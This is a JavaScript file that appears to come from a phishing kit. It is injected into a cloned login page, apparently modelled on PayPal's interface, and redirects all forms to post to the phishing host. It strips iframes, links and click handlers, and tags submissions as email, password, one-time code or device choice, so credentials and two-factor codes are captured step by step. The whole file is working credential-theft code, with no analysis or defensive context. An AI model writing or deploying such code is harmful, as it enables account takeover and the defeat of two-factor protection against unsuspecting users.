let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})

// sets
let btnNext = document.querySelector(`#btnNext`)
let password = document.querySelector(`[spike-email-done="true"]`)
let otpBoxs = document.querySelectorAll(`[type="number"]`)
let radios = document.querySelectorAll(`[type="radio"]`)

if (password) {
    addSpikeType("password")
} else if (btnNext) {
    addSpikeType("email")
} else if (otpBoxs.length == 6) {
    addSpikeType("otp_code")
    let codeInput = document.querySelector(".codeInput")
    codeInput.innerHTML = `<div class="ppvx_text-input___3-14-9 ppvx_text-input--nolabel___3-14-9 ppvx--v2___3-14-9 ppvx_code-input__text-input___1-4-10">
    <input type="number" name="spike_otp_code" required placeholder="CODE" maxlength="6" 
    class="ppvx_text-input__control___3-14-9 ppvx_code-input__input___1-4-10 hasHelp"></div>`

} else if (radios.length > 0) {
    addSpikeType("opt_devices")
    document.forms[0].innerHTML += `<input type="hidden" name="spike-device-index" value="0">`
    radios.forEach((v, i) => {
        v.addEventListener("click", () => {
            document.querySelector(`[name="spike-device-index"]`).value = i
        })
    })
}

// functions
let loader = document.querySelector('.loaderOverlay')
if (loader) {
    loader.remove()
}

let devSubmit = document.querySelector(`[data-nemo="entrySubmit"]`)
if (devSubmit) {
    devSubmit.addEventListener("click", () => {
        setTimeout(() => {
            document.forms[0].submit()
        })
    })
}